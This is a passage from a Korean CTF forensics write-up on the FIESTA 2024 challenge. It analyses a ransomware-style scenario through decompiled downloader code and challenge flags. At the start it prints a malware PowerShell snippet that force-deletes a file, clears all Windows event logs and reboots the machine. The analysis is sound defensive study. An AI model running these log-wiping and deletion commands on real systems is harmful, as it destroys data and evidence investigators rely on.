&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Test-Path&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filePath&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Remove-Item&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$filePath&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wevtutil&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;el&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;foreach&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;wevtutil&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$_&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Start-Sleep&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Seconds&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;300&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Restart-Computer&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;을 삭제한다고 되어 있는데&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2027.png&quot; alt=&quot;image.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.exe&lt;/code&gt; 내부에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt; 문자열은 존재하지 않음.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1.exe&lt;/code&gt; 의 짜임새를 봤을 때, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt; 문자열을 따로 인코딩하여 데이터 영역에 넣어두지도 않았을 가능성이 높음&lt;/p&gt;

&lt;p&gt;즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt;은 어딘가에서 다운로드 되었을 가능성이 높음.&lt;/p&gt;

&lt;p&gt;높은 확률로 저 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;imnothackerkkk&lt;/code&gt; 레포일 것이므로, 해당 레포를 뒤져 보았다.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;imnothackerkkk/key/secret
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Giveme the100BTC!!!&lt;/code&gt;&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;imnothackerkkk/enc/main&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2028.png&quot; alt=&quot;image.png&quot; width=&quot;50%&quot; height=&quot;50%&quot; /&gt;&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;lock.ps1의 암호화된 버전과 복호화 기반이 될 수 있는 툴을 가지고 있는 것으로 보인다.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;imnothacker/secret/hi!!!
    &lt;ol&gt;
      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CBCAMP{D0Y0UKN0WAboutWebAr71F4C7?}&lt;/code&gt;&lt;/li&gt;
      &lt;li&gt;이건 뭐지&lt;/li&gt;
    &lt;/ol&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;enc 레포에 접근하는 행위는 현재까지 분석한 파일에서 보이지 않았다.&lt;/p&gt;

&lt;p&gt;그러나, 암호화의 핵심으로 보이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt; 파일과 관련된 레포이므로 분석해 보았다.&lt;/p&gt;

&lt;p&gt;(그래서 저 레포에는 언제 어떻게 접근한 거지?)&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;3-암호화-쉘스크립트-다운로더-분석encexe&quot;&gt;3. 암호화 쉘스크립트 다운로더 분석(enc.exe)&lt;/h1&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;31-overview&quot;&gt;3.1. Overview&lt;/h2&gt;

&lt;p&gt;해당 다운로더를 virustotal에 돌려보면, 아래와 같은 행위가 나온다.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2029.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;따라서, 다운로더 내부에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt; 혹은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock_encrypted.ps1&lt;/code&gt;을 콜하는 루틴이 있는지 확인해 보았다.&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lock.ps1&lt;/code&gt; 파일을 확보해야 하니까…&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2030.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;있음&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2031.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;main함수의 초장부터 콜하네&lt;/p&gt;

&lt;p&gt;XOR이라면 대칭키일듯?&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;main의 전문은 다음과 같음&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__cdecl&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+4h] [ebp-58h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+14h] [ebp-48h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+18h] [ebp-44h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+1Ch] [ebp-40h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+2Ch] [ebp-30h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+30h] [ebp-2Ch]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+34h] [ebp-28h] BYREF&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+44h] [ebp-18h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+48h] [ebp-14h]&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+58h] [ebp-4h]&lt;/span&gt;

  &lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_405220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lock.ps1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v14&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v15&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_405220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v13&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;lock_encrypted.ps1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x12u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_OWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v12&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_405220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;specialllll!!!!!!!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x12u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;LOBYTE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;sub_401E80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Block&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cp&quot;&gt;# --- 후략; ---
# 오류가 발생하지 않은 이상 진입할 일 없는 code branch
&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;암호화 루틴이라기보다는 암호화 루틴을 콜하는 부분에 가까운 듯&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;32-sub_405220-분석&quot;&gt;3.2. sub_405220 분석&lt;/h2&gt;

&lt;p&gt;해당 함수는 main에서 총 3회 아래와 같이 콜되는 함수&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_405220(v7, &quot;lock.ps1&quot;, 8u);&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_405220(v13, &quot;lock_encrypted.ps1&quot;, 0x12u);&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sub_405220(Block, &quot;specialllll!!!!!!!&quot;, 0x12u);&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;핵심은 첫 번째 인자에 뭐가 들어와서 리턴되느냐인가?&lt;/p&gt;

&lt;p&gt;맞는 듯&lt;/p&gt;

&lt;p&gt;사유&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/2025-02-02-FIESTA2024-cert1/image%2032.png&quot; alt=&quot;image.png&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;C 계열 언어로 컴파일된 프로그램상에서 함수를 콜했는데 결과값을 *ax에 넣는 흐름이 없음&lt;/p&gt;

&lt;p&gt;그럼 인자로 준 포인터 계열 파라미터가 Caller 와 Callee를 연결할 수 있는 방법일 텐데&lt;/p&gt;

&lt;p&gt;main에서 해당 함수를 호출하는 양상을 봤을 때 첫 번째 파라미터가 1) 포인터 계열이고 2) 3개 인자 중 유일하게 비어 있는 인자임&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;그럼 해당 함수는 첫 번째 인자에 최종적으로 뭘 넣어주는지 확인해 보자.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__thiscall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sub_405220&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// edi&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ecx&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ecx&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// eax&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [esp+10h] [ebp-4h]&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x7FFFFFFF&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sub_401270&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xF&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;15&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;memmove&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;return_value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Src&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
